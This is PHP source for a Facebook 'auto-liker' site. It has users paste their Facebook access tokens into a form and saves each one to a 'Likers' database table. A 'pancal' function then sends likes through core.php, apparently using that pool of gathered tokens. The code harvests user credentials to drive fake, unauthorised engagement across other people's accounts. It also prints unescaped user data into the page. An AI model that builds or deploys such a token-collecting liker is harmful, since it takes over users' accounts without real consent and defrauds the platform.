
<!-- css and html HEADER -->	
<?php include 'head.php';?>
	
<!-- gioi han xai 15phu -->
<?php
error_reporting(0);
$lamafile = 900;
$waktu = time();
if ($handle = opendir('datablock')) {
	while(false !== ($file = readdir($handle)))
	{
		$akses = fileatime('datablock/'.$file);
		if( $akses !== false)
		if( ($waktu- $akses)>=$lamafile )
		unlink('datablock/'.$file);
	}
	closedir($handle);
}
?>

<?php
$like = new like();

// Here is how to parse in the advertisement
if($_GET[act]){
	print '<script>top.location.href="/token.php"</script>';
}

if($_SESSION['token']){
	$access_token = $_SESSION['token'];
	$me = $like -> me($access_token);
	if($me['id']){
		include'config.php';
		//
		// chay nhung cai code nay neu db chua co
		//
		/*
		mysql_query("CREATE TABLE IF NOT EXISTS `Likers` (
		`id` int(11) NOT NULL AUTO_INCREMENT,
		`user_id` varchar(32) NOT NULL,
		`name` varchar(32) NOT NULL,
		`access_token` varchar(255) NOT NULL,
		PRIMARY KEY (`id`)
		) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
		"); 
		*/
		
		//
		// Be careful of the escape ' string, always a problem here
		//
		$row = null;
		
		$result = mysql_query("SELECT * FROM Likers WHERE user_id = '" . mysql_real_escape_string($me['id']) . "'");
		
		if($result){
			$row = mysql_fetch_array($result, MYSQL_ASSOC);
			if(mysql_num_rows($result) > 1){
				mysql_query("DELETE FROM Likers WHERE user_id='" . mysql_real_escape_string($me['id']) . "' AND id != '" . $row['id'] . "'");
			}
		}
		
		if(!$row){
			mysql_query("INSERT INTO Likers SET
									`user_id` = '" . mysql_real_escape_string($me['id']) . "',
									`name` = '" . mysql_real_escape_string($me['name']) . "',
									`access_token` = '" . mysql_real_escape_string($access_token) . "'");
		} else {
			mysql_query("UPDATE Likers SET
			`access_token` = '" . mysql_real_escape_string($access_token) . "'
			WHERE	`id` = " . $row['id'] . "");
		}
		
		mysql_close($connection);
		
		if($limit = fileatime('datablock/'.$me[id])){
			$timeoff = time();
			$cek = date("i:s",$timeoff - $limit);
			echo'<div align="right"><div class="container"><font color="red">Wait 15:00 Seconds: '.$cek.'</font></div></div>';
		}else{
			echo'<div align="right"><div class="container"><font color="red">Next Submit: READY..!</font></div></div>';
		}
		
		//////////////////////////////////////////
		///////// TEMPLATE AFTER LOGGED IN ///////
		//////////////////////////////////////////
		
		echo'
				<div class="container"><div class="well"><table>
			  <tr>
			    <th rowspan="3"><a href="http://facebook.com/'.$me[id].'"><img src="https://graph.facebook.com/'.$me[id].'/picture?type=large" alt="Profile" style="height:100px;width:100px;-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red"/></a></th>
			    <th>'.$me[name].'&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;'.$me[gender].'&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;'.$me[locale].'</th>
			  </tr>
			  <tr>
			    <td>Profile ID: <b> '.$me[id].'</b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;Profile Link: <b> '.$me[link].'</b></td>
			  </tr>
			  <tr>
			    <td>Email: <b> '.$me[email].'</b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;Phone Number: <b> '.$me[mobile_phone].'</b></td>
			  </tr>
				</table>
				</div></div>';
		
		$like -> gathertokens($access_token);
		
		if($_POST[id]){
			if($limit = fileatime('datablock/'.$me[id])){
				echo' <div class="container"><div class="alert alert-dismissable alert-danger">
				<button type="button" class="close" data-dismiss="alert">&times;</button>
				<strong>Opps!</strong>
				Like Failed Please Wait 15:00 Seconds for Submit again.<br/>
				<form action="/"><input class="btn btn-primary" type="submit" value="Back"></form></div>
				</div></div>';
				exit;
			}
			if(!is_dir('datablock')){
				mkdir('datablock');
			}
			$bg=fopen('datablock/'.$me[id],'w');
			fwrite($bg,1);
			fclose($bg);
			$like -> pancal($_POST[id]);
		}else{
			$like -> getData($access_token);
		}
	}else{
		$like -> invalidToken();
	}
}else{
	$like->form();
}

class like {
	/* 
	Send likes using this function
	*/
	public function pancal($id){
		// id is the id of the post to be liked, not the userID
		// this should be tried many times to avoid hipcup
		for($i=1;$i<4;$i++){
		$this-> _req('http://'.$_SERVER[HTTP_HOST].'/core.php?like='.$id); }
		print '<div class="container"><div class="alert alert-dismissable alert-success">
		<button type="button" class="close" data-dismiss="alert">&times;</button>
		<strong>Congrat!</strong> Likes have been sent successfully. Please check your facebook.<br/>
		<form action="/"><input class="btn btn-primary" type="submit" value="Back"></form></div></div>';
	}
	
	/* 
	Get user info using this function
	*/
	public function me($access){
		return json_decode($this-> _req('https://graph.fb.me/me?access_token='.$access),true);
	}
	
	/* 
	Gathering access token
	*/
	public function gathertokens($access){
		
	}
	
	/* 
	Display message for invalid token
	*/
	public function invalidToken(){
		print '<div class="container"><div class="alert alert-dismissable alert-danger">
		<button type="button" class="close" data-dismiss="alert">&times;</button>
		<strong>It aint right!</strong> Your token is either expired or invalid!
		</div></div>';
		$this->form();
	}
	
	/* 
	This is the main FORM that takes in the token and display info
	on the main website. Since i'm using template from header.php so this must be
	output by echo
	*/
	public function form(){
		echo'<!-- Main form -->
		<div class="jumbotron" style="margin: 1% auto;margin-top:-20px;"><center><a href="/"><img src="/img/lanaspcelikerlogo.png"></a></center>
		<h1 style="text-align: center;"><font color="009c84">Welcome to Lana Spce Liker</font></h1>
		<p style="text-align: center;"> Lana Spce Liker is a social marketing system that will increase likes on facebook. Our system is based on an online community of users who look get likes quickly and easily. Lana Spce Liker is part of Lana Spce Network Developed by <a href="http://fb.me/cyberspc3">CYBER SPCE TEAM.</a></div>
		<div class="alert alert-dismissable alert-info">
		<button type="button" class="close" data-dismiss="alert"> &times; </button>
		<strong> Info! </strong> If you are First Time User, Dont forget to read our README and Give permission to our App before generating new token :)
		</div>
		<div class="alert alert-dismissable alert-info">
		<button type="button" class="close" data-dismiss="alert"> &times; </button>
		<strong> Info! </strong> Yaz-Spce Liker is Working Fine Now , You Can Get 100+ Likes , We Will Increase The Likes Limit Soon.
		</div>
		</p>
		
		<!-- Each column feature -->
		<div id="feature" class="row" style="max-
		width: 1024px; margin: 0 auto;">
		<div class="col-sm-4">
		<div class="bs-component">
		<div class="panel panel-default">
		<div style="text-align:center" class="panel-
		body"><br>
		<a href=""><img style="height: 100px;display:
		block;margin: 0 auto;" src="/img/no_spam.png"></a>
		<strong> NO SPAM </strong>
		<p> We never spaming on your Facebook
		Account. Our autoliker is totally spam free
		</p><br><br>
		</div>
		</div>
		</div>
		</div>
		<div class="col-sm-4">
		<div class="bs-component">
		<div class="panel panel-default">
		<div style="text-align:center" class="panel-
		body"><br>
		<a href=""><img style="height: 100px;display:
		block;margin: 0 auto;" src="/img/likes.png"></a>
		<strong> Instant Likes </strong>
		<p> Get instant 100+ likes per submit and UP-
		TO 300 Likes on your Statuses, Pictures,
		Albums, and other facebook Posts for
		<strong> FREE </strong></p>
		</div>
		</div>
		</div>
		</div> <div class="col-sm-4">
		<div class="bs-component">
		<div class="panel panel-default">
		<div style="text-align:center" class="panel-
		body"><br>
		<a href=""><img style="height: 100px;display:
		block;margin: 0 auto;" src="/img/trust.png"></a>
		<strong> Trusted Site </strong>
		<p> We have Online Since 2013 and always
		keep online to help you Provide free services
		</p><br>
		</div>
		</div>
		</div>
		</div>
		</div>
		<div id="login" class="jumbotron" style="padding:20px;color: white;background: rgb(0, 199, 143);text-align:center;max-width:1024px;margin: 1% auto;">
		<text style="font: italic small-caps bold 25px/20px Helvetica, sans-serif;">
		Method Login to Lana Spce Liker
		</text>
		<hr>
		<a class="btn btn-primary" href="/?act=getToken" title="Then Click Here To Get Access Token!" target="_blank">Click Here</a> To Get Access Token afterthat COPY and PASTE URL in the ADDRESS BAR to BELOW, <br>
		<hr>
		Paste the URL in the ADDRESS BAR here !
		<a href="/"><img src="/img/arrow.png" width="50" height="50"></a>
		<form action="login.php" method="get" style="margin-top: 12px;">
		<div class="form-group">
		<div class="input-group">
		<span class="input-group-addon"><img height="23px" src="/img/lock.png"></span>
		<input title="Paste Your Token Here !" type="text" name="user" placeholder="Paste Your Token Here.... !" class="form-control" value="'.$_SESSION['token'].'"/>
		<span class="input-group-btn">
		<button class="btn btn-default" type="submit"> Submit</button>
		</span>
		</div>
		</div>
		</form>
		<hr>
		</div>';
	}
	public function getData($access){
		$feed=json_decode($this -> _req('https://graph.fb.me/me/feed?access_token='.$access.'&limit=7'),true);
		if(count($feed[data]) >= 1){
			echo'
			<div class="clip"><div align="center">CUSTOM POST ID</div></div>
			<div class="gmenu"><center><form action="/" method="post"/>
			<input type="text" name="id"/>
			<input type="hidden" name="access_token" value="'.$access.'"/>
			<button name="pancal" class="btn btn-default" type="submit">Submit</button>
			</form></center></div>
			<div class="container">Select Status:</div>';
			for($i=0;$i<count($feed[data]);$i++){
				$uid = $feed[data][$i][from][id];
				$name = $feed[data][$i][from][name];
				$type = $feed[data][$i][type];
				$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
				$id = $feed[data][$i][id];
				$pic = $feed[data][$i][picture];
				echo'
				<div class="container"><div class="well">
				<table>
				<tr>
				<td valign="top" class="yusuf">
				<img src="http://graph.facebook.com/'.$uid.'/picture" alt="Your Pict" />
				</td>
				<td valign="top" class="l">
				<span class="mfss">
				<a href="http://facebook.com/'.$uid.'" target="_blank" class="sec">
				'.$name.'
				</a>
				</span><br/>
				<span class="mfss fcg">
				<abbr>
				'.$type.'
				</abbr>
				<b>
				<span class="fcg mfss">
				&middot;
				</span>
				</b>
				<img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yv/r/5SYOjS874Mk.png" width="10" height="11" class="feedAudienceIcon img" />
				</span></div>
				</div></div>';

				if($type=='photo'){
					echo '
					<br>
					<img src="'.$pic.'"/>
					';
				}else{
					echo '
					<br/>
					<span>
					'.$mess.'
					</span>
					';
				}
				echo '
				</td>
				</tr>
				</table>
				<div align="right">
				<form action="/" method="post"/>
				<input title="Your Post ID !" class="form-control input-sm" type="text" style="width:30%" name="id" value="'.$id.'"/>
				<input type="hidden" name="access_token" value="'.$access.'"/>
				<input name="pancal" type="submit" class="btn btn-info" value="Submit">
				</form>
				</div>
				</div>
				</div> ';
			}
		}else{
			print ' <div class="container"> <div class="alert alert-dismissable alert-danger">
			<button type="button" class="close" data-dismiss="alert">&times;</button>
			<strong>Opps!</strong> Your Status Not Found.<br/>
			<a class="btn btn-primary" href="logout.php" title="Logout">Logout</a></div>
			</div>';
		}
		print '
		</div>
		';
	}
	private function _req($url){
		$ch = curl_init();
		curl_setopt_array($ch,array(
		CURLOPT_CONNECTTIMEOUT => 5,
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_URL => $url,
		)
		);
		$result = curl_exec($ch);
		curl_close($ch);
		return $result;
	}
}
?>
<?php include 'foot.php';?>
</body>
</html>